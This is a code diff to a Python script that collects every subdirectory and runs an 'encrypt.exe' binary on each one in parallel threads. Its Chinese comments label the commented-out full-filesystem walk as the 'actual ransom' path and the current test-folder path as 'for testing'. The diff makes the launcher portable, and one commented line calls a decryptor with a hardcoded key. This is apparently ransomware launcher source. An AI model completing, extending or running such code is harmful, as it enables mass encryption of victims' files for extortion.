@@ -1,14 +1,17 @@
 import subprocess
-import os  
+import os 
+import sys
 import threading
 import time
-CUR_PATH = os.path.dirname(__file__)
+
+CUR_PATH = os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.path.dirname(__file__)
+
 def getfilename():
     fileList = []
     # for root, dirs, files in os.walk("..\\"*100+"..", topdown=False):      # 实际勒索
-    for root, dirs, files in os.walk(CUR_PATH+"\\test", topdown=False):      # 用于测试
+    for root, dirs, files in os.walk(CUR_PATH+"/test", topdown=False):      # 用于测试
         for name in dirs:
-            fileList.append(os.path.join(root, name+'\\'))
+            fileList.append(os.path.join(root, name+'/'))
     return fileList
 
 def encryexe(file='', command=''):
@@ -27,7 +30,7 @@ def encrypt_file():
     fileList = getfilename()
     print(fileList)
     for index,i in enumerate(fileList):
-        p.append(threading.Thread(target=encryexe, args=(CUR_PATH+'\\encrypt.exe', i,)))
+        p.append(threading.Thread(target=encryexe, args=(CUR_PATH+'/encrypt.exe', i,)))
         # p.append(multiprocessing.Process(target=encryexe, args=('de.exe', i+' 11111111111111111111111111111111 1111111111111111',)))
         p[index].deamon = True
         p[index].start()
